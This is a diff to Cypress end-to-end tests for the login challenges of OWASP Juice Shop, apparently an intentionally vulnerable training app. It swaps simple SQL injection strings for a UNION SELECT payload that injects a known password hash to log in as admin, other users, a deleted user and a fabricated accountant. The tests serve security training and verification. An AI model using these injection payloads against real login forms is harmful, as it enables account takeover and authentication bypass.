@@ -1,19 +1,17 @@
+const passwordHashOfA = 'scrypt$b88e98be63f7b315842a35420345d181$b78aaf0f0fb49afa674a1e069940efecb827bf974a4c179596571198cfaabfabb7b6d2150c4e306d43baecbfd1a4bb13332f533eec422cbf396a23a8570ee0fc'
+const unionLoginPayload = (email: string) =>
+  `' UNION SELECT id, username, email, '${passwordHashOfA}', role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt FROM Users WHERE email = '${email}'--`
+
 describe('/#/login', () => {
   beforeEach(() => {
     cy.visit('/#/login')
   })
 
   describe('challenge "loginAdmin"', () => {
-    it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
-      cy.get('#email').type("' or 1=1--")
-      cy.get('#password').type('a')
-      cy.get('#loginButton').click()
-    })
-
-    it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
+    it('should log in Admin with UNION SELECT SQLI attack on email field', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
-          cy.get('#email').type(`admin@${appDomain}'--`)
+          cy.get('#email').type(unionLoginPayload(`admin@${appDomain}`))
           cy.get('#password').type('a')
           cy.get('#loginButton').click()
         }
@@ -23,10 +21,10 @@ describe('/#/login', () => {
   })
 
   describe('challenge "loginJim"', () => {
-    it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
+    it('should log in Jim with UNION SELECT SQLI attack on email field', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
-          cy.get('#email').type(`jim@${appDomain}'--`)
+          cy.get('#email').type(unionLoginPayload(`jim@${appDomain}`))
           cy.get('#password').type('a')
           cy.get('#loginButton').click()
         }
@@ -36,10 +34,10 @@ describe('/#/login', () => {
   })
 
   describe('challenge "loginBender"', () => {
-    it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
+    it('should log in Bender with UNION SELECT SQLI attack on email field', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
-          cy.get('#email').type(`bender@${appDomain}'--`)
+          cy.get('#email').type(unionLoginPayload(`bender@${appDomain}`))
           cy.get('#password').type('a')
           cy.get('#loginButton').click()
         }
@@ -117,8 +115,8 @@ describe('/#/login', () => {
     it('should be able to log into a existing 2fa protected account given the right token', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
-          cy.get('#email').type(`wurstbrot@${appDomain}'--`)
-          cy.get('#password').type('Never mind...')
+          cy.get('#email').type(unionLoginPayload(`wurstbrot@${appDomain}`))
+          cy.get('#password').type('a')
           cy.get('#loginButton').click()
         }
       )
@@ -144,16 +142,10 @@ describe('/#/login', () => {
   })
 
   describe('challenge "ghostLogin"', () => {
-    it('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', () => {
-      cy.get('#email').type("' or deletedAt IS NOT NULL--")
-      cy.get('#password').type('a')
-      cy.get('#loginButton').click()
-    })
-
-    it('should be able to log in as chris.pike@juice-sh.op by using "chris.pike@juice-sh.op\' --"', () => {
+    it('should be able to log in as deleted user chris.pike@juice-sh.op with UNION SELECT SQLI attack on email field', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
-          cy.get('#email').type(`chris.pike@${appDomain}'--`)
+          cy.get('#email').type(unionLoginPayload(`chris.pike@${appDomain}`))
           cy.get('#password').type('a')
           cy.get('#loginButton').click()
         }
@@ -165,7 +157,7 @@ describe('/#/login', () => {
   describe('challenge "ephemeralAccountant"', () => {
     it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
       cy.get('#email').type(
-        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--"
+        `' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '${passwordHashOfA}' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`
       )
       cy.get('#password').type('a')
       cy.get('#loginButton').click()
